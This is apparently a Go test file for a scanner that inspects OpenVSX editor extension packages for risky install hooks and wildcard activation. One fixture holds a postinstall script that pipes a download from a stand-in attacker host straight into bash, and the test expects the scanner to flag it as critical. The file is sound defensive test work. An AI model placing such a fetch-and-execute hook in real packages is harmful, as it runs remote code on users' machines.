package installhooks

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"testing"
)

// vsixZip builds a minimal .vsix (a zip whose contents live under "extension/")
// carrying the given package.json manifest.
func vsixZip(manifest map[string]any) []byte {
	data, _ := json.Marshal(manifest)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("extension/package.json")
	_, _ = w.Write(data)
	// A second, non-manifest file to exercise directory walking.
	rw, _ := zw.Create("extension/README.md")
	_, _ = rw.Write([]byte("# demo extension"))
	_ = zw.Close()
	return buf.Bytes()
}

func assessVsix(t *testing.T, zipBytes []byte) *Report {
	t.Helper()
	svc, err := NewService(DefaultConfig())
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	art := Artifact{Ecosystem: "openvsx", Name: "ns.ext", Version: "1.0.0", Filename: "ns.ext-1.0.0.vsix"}
	report, err := svc.Assess(art, opener(zipBytes))
	if err != nil {
		t.Fatalf("Assess: %v", err)
	}
	return report
}

func TestOpenVSXCleanExtension(t *testing.T) {
	zb := vsixZip(map[string]any{
		"name":             "demo",
		"version":          "1.0.0",
		"activationEvents": []string{"onLanguage:go"},
		"contributes":      map[string]any{"commands": []any{}, "themes": []any{}},
		"scripts":          map[string]string{"compile": "tsc -p ./"},
	})
	report := assessVsix(t, zb)
	if !report.Inspected {
		t.Fatal("expected the .vsix to be inspected")
	}
	if report.HasFindings() {
		t.Errorf("clean extension flagged: %+v", report.Findings)
	}
	// The activation + contributes manifest surfaces must be visible as hooks.
	if !hasHookLabel(report.Hooks, "openvsx:activation") || !hasHookLabel(report.Hooks, "openvsx:contributes") {
		t.Errorf("activation/contributes hooks not surfaced: %+v", report.Hooks)
	}
}

func TestOpenVSXMaliciousPostinstall(t *testing.T) {
	zb := vsixZip(map[string]any{
		"name":    "demo",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": "curl https://evil.example/x.sh | bash",
		},
	})
	report := assessVsix(t, zb)
	if !report.HasFindings() {
		t.Fatal("expected the malicious postinstall to be flagged")
	}
	if !hasRule(report.Findings, RuleDownloadExecute) {
		t.Errorf("expected download-execute finding, got %+v", report.Findings)
	}
	if report.MaxSeverity != SeverityCritical {
		t.Errorf("maxSeverity = %q, want critical", report.MaxSeverity)
	}
}

func TestOpenVSXWildcardActivation(t *testing.T) {
	zb := vsixZip(map[string]any{
		"name":             "demo",
		"version":          "1.0.0",
		"activationEvents": []string{"*"},
	})
	report := assessVsix(t, zb)
	if !hasRule(report.Findings, RuleWildcardActivate) {
		t.Errorf("expected wildcard-activation finding, got %+v", report.Findings)
	}
}

func TestParseVSIXManifest(t *testing.T) {
	data := []byte(`{
		"name":"demo","version":"1.0.0",
		"activationEvents":["onStartupFinished","","onLanguage:go"],
		"contributes":{"commands":[],"menus":{}},
		"scripts":{"vscode:prepublish":"npm run compile","compile":"tsc"}
	}`)
	scripts, activation, contributes, err := ParseVSIXManifest(data)
	if err != nil {
		t.Fatalf("ParseVSIXManifest: %v", err)
	}
	if scripts["vscode:prepublish"] != "npm run compile" {
		t.Errorf("scripts = %+v", scripts)
	}
	if len(activation) != 2 { // the empty event is dropped
		t.Errorf("activation = %+v", activation)
	}
	// contributes is sorted for determinism.
	if len(contributes) != 2 || contributes[0] != "commands" || contributes[1] != "menus" {
		t.Errorf("contributes = %+v", contributes)
	}
}

func hasHookLabel(hooks []Hook, label string) bool {
	for _, h := range hooks {
		if h.Label == label {
			return true
		}
	}
	return false
}
